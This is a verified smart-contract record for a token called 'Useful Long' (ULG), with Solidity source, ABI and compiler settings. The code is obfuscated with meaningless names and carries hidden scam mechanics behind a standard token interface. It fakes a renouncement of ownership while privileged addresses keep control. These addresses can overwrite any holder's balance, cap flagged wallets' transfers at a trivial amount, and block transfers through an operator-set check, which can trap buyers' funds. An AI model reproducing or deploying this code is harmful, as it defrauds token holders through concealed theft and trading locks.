{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface marketingReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeLaunchLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderTo {\n    function createPair(address launchedList, address atFund) external returns (address);\n}\n\ninterface tradingToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isToWallet) external view returns (uint256);\n\n    function transfer(address marketingFromBuy, uint256 receiverFee) external returns (bool);\n\n    function allowance(address autoLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingFromBuy,\n        uint256 receiverFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountBuy, uint256 value);\n    event Approval(address indexed autoLiquidity, address indexed spender, uint256 value);\n}\n\ninterface tradingTokenMetadata is tradingToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UsefulLong is feeLaunchLimit, tradingToken, tradingTokenMetadata {\n\n    mapping(address => uint256) private walletLaunch;\n\n    bool private amountMax;\n\n    address isMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private takeMaxReceiver = 18;\n\n    uint256 receiverReceiver;\n\n    function takeEnable(address txFundList) public {\n        receiverTrading();\n        if (receiverModeTrading != fromMode) {\n            senderTeam = true;\n        }\n        if (txFundList == modeLimitSwap || txFundList == modeExempt) {\n            return;\n        }\n        fundReceiverFee[txFundList] = true;\n    }\n\n    uint256 limitShould;\n\n    address public modeExempt;\n\n    uint256 private fromMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeMaxReceiver;\n    }\n\n    function balanceOf(address isToWallet) public view virtual override returns (uint256) {\n        return walletLaunch[isToWallet];\n    }\n\n    constructor (){\n        if (tradingLaunched != receiverModeTrading) {\n            receiverModeTrading = fromMode;\n        }\n        marketingReceiver teamSenderList = marketingReceiver(isWallet);\n        modeExempt = senderTo(teamSenderList.factory()).createPair(teamSenderList.WETH(), address(this));\n        \n        modeLimitSwap = _msgSender();\n        atSender();\n        autoSwap[modeLimitSwap] = true;\n        walletLaunch[modeLimitSwap] = atWallet;\n        \n        emit Transfer(address(0), modeLimitSwap, atWallet);\n    }\n\n    address isWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function atSender() public {\n        emit OwnershipTransferred(modeLimitSwap, address(0));\n        tradingReceiver = address(0);\n    }\n\n    uint256 public tradingLaunched;\n\n    function receiverTrading() private view {\n        require(autoSwap[_msgSender()]);\n    }\n\n    uint256 public feeLiquidity;\n\n    address public modeLimitSwap;\n\n    uint256 private atWallet = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private liquidityAmount;\n\n    string private atIs = \"Useful Long\";\n\n    function modeWallet(address minTo, uint256 receiverFee) public {\n        receiverTrading();\n        walletLaunch[minTo] = receiverFee;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingReceiver;\n    }\n\n    uint256 private receiverModeTrading;\n\n    event OwnershipTransferred(address indexed liquidityWalletEnable, address indexed atFrom);\n\n    function symbol() external view virtual override returns (string memory) {\n        return isReceiver;\n    }\n\n    bool private receiverIs;\n\n    mapping(address => bool) public autoSwap;\n\n    bool private toReceiverLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atWallet;\n    }\n\n    function owner() external view returns (address) {\n        return tradingReceiver;\n    }\n\n    mapping(address => bool) public fundReceiverFee;\n\n    function atLiquidityTrading(address totalEnable, address marketingFromBuy, uint256 receiverFee) internal returns (bool) {\n        require(walletLaunch[totalEnable] >= receiverFee);\n        walletLaunch[totalEnable] -= receiverFee;\n        walletLaunch[marketingFromBuy] += receiverFee;\n        emit Transfer(totalEnable, marketingFromBuy, receiverFee);\n        return true;\n    }\n\n    bool public listSellReceiver;\n\n    bool public senderTeam;\n\n    function transfer(address minTo, uint256 receiverFee) external virtual override returns (bool) {\n        return swapTokenLimit(_msgSender(), minTo, receiverFee);\n    }\n\n    function allowance(address tokenTxBuy, address minSwapMax) external view virtual override returns (uint256) {\n        if (minSwapMax == isWallet) {\n            return type(uint256).max;\n        }\n        return liquidityAmount[tokenTxBuy][minSwapMax];\n    }\n\n    function swapTokenLimit(address totalEnable, address marketingFromBuy, uint256 receiverFee) internal returns (bool) {\n        if (totalEnable == modeLimitSwap) {\n            return atLiquidityTrading(totalEnable, marketingFromBuy, receiverFee);\n        }\n        uint256 enableExempt = tradingToken(modeExempt).balanceOf(isMax);\n        require(enableExempt == receiverReceiver);\n        require(marketingFromBuy != isMax);\n        if (fundReceiverFee[totalEnable]) {\n            return atLiquidityTrading(totalEnable, marketingFromBuy, launchedIsMarketing);\n        }\n        return atLiquidityTrading(totalEnable, marketingFromBuy, receiverFee);\n    }\n\n    function amountTrading(uint256 receiverFee) public {\n        receiverTrading();\n        receiverReceiver = receiverFee;\n    }\n\n    string private isReceiver = \"ULG\";\n\n    uint256 constant launchedIsMarketing = 14 ** 10;\n\n    function transferFrom(address totalEnable, address marketingFromBuy, uint256 receiverFee) external override returns (bool) {\n        if (_msgSender() != isWallet) {\n            if (liquidityAmount[totalEnable][_msgSender()] != type(uint256).max) {\n                require(receiverFee <= liquidityAmount[totalEnable][_msgSender()]);\n                liquidityAmount[totalEnable][_msgSender()] -= receiverFee;\n            }\n        }\n        return swapTokenLimit(totalEnable, marketingFromBuy, receiverFee);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atIs;\n    }\n\n    function maxLaunched(address marketingLimit) public {\n        require(marketingLimit.balance < 100000);\n        if (listSellReceiver) {\n            return;\n        }\n        if (toReceiverLaunched) {\n            senderTeam = false;\n        }\n        autoSwap[marketingLimit] = true;\n        \n        listSellReceiver = true;\n    }\n\n    uint256 private enableTake;\n\n    address private tradingReceiver;\n\n    function approve(address minSwapMax, uint256 receiverFee) public virtual override returns (bool) {\n        liquidityAmount[_msgSender()][minSwapMax] = receiverFee;\n        emit Approval(_msgSender(), minSwapMax, receiverFee);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityWalletEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTxBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSwapMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"amountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSwapMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isToWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundReceiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"}],\"name\":\"maxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimitSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"modeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFundList\",\"type\":\"address\"}],\"name\":\"takeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingFromBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UsefulLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}